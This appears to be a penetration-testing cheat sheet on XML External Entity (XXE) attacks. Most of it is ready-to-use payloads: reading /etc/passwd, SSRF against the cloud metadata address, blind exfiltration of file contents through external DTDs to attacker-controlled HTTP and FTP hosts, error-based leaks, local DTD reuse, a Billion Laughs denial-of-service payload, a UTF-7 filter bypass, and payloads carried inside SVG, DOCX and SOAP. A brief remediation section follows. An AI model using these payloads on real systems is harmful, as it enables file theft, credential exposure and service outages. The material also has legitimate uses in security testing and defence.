# XXE

XML External Entity. Applies wherever XML is parsed server-side — SOAP, SAML, SVG, DOCX/XLSX, RSS, OPML, PDF (XMP), XML APIs.

## Basic file read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

Access control bypass via PHP wrapper (reads restricted PHP file as base64):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>&ac;</result></foo>
```

Endpoints to try: `Content-Type: application/xml`, `text/xml`, SOAP `application/soap+xml`. Also form fields that end up in XML server-side.

## SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<foo>&xxe;</foo>
```

## Blind XXE — OOB

No data in response. Use parameter entities + external DTD to exfil via DNS/HTTP.

Attacker hosts `evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>">
%eval;
%exfil;
```

Target request:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://attacker/evil.dtd"> %ext; ]>
<foo>a</foo>
```

For files with special chars, wrap via `php://filter/convert.base64-encode/resource=...` when target is PHP.

## Error-based exfil

When OOB blocked, trigger a parser error that includes file contents.

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Error message often includes the resolved path = file contents.

## Local DTD smuggling

No egress for `evil.dtd`? Reuse a local DTD on disk and redefine entities.

Example (Linux, Red Hat default):

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamsa '&#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x26; send "%file;">'>
  %local_dtd;
]>
<foo>&send;</foo>
```

List of candidate local DTDs: [GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder).

## XEE — Billion Laughs DoS

Exponential entity expansion. Test on endpoints where XML parsing is expensive or rate-limited:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## OOB via FTP (Java targets)

FTP exfil bypasses HTTP-only egress filters. Host `parameterEntity_sendftp.dtd` on attacker server:

```xml
<!-- Target request -->
<!DOCTYPE data [
<!ENTITY % remote SYSTEM "http://attacker.com/parameterEntity_sendftp.dtd">
%remote;
%send;
]>
<data>4</data>
```

```xml
<!-- parameterEntity_sendftp.dtd on attacker server -->
<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://attacker.com/%payload;'>">
%param1;
```

Reference: http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html

## UTF-7 encoding

Some parsers accept UTF-7 encoded DOCTYPE, bypassing UTF-8 content filters:

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://attacker.com:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

Convert: `recode UTF8..UTF7 payload-file.xml`

## XXE in file-format wrappers

- DOCX/XLSX/PPTX — zip → XML files. Replace `document.xml` / `sharedStrings.xml` with XXE payload, re-zip, upload.
- SVG upload — many avatar/image endpoints parse SVG XML:

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg><text>&xxe;</text></svg>
```

- PDF XMP metadata, RSS/Atom feeds, KML, GPX.

## SOAP

SOAP services are frequently overlooked:

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <!DOCTYPE ... >
  <soap:Body><n:foo xmlns:n="...">&xxe;</n:foo></soap:Body>
</soap:Envelope>
```

## Parser fingerprinting

- libxml2 (PHP, Python lxml) — most flexible.
- Xerces (Java) — strict, but accepts params entities unless hardened.
- .NET XmlReader — DTD disabled by default in modern versions.
- Go `encoding/xml` — no DTD processing.

Check `Server:` and error messages for hints.

## Remediation

- Disable DTD processing entirely in the parser (`setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` for Xerces).
- For Python: `lxml.etree.XMLParser(resolve_entities=False, no_network=True)`.
- Use defusedxml in Python.
- Content-Type strict — reject `application/xml` where not needed.

## References

- PortSwigger XXE — https://portswigger.net/web-security/xxe
- PayloadsAllTheThings XXE — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- GoSecure DTD finder — https://github.com/GoSecure/dtd-finder
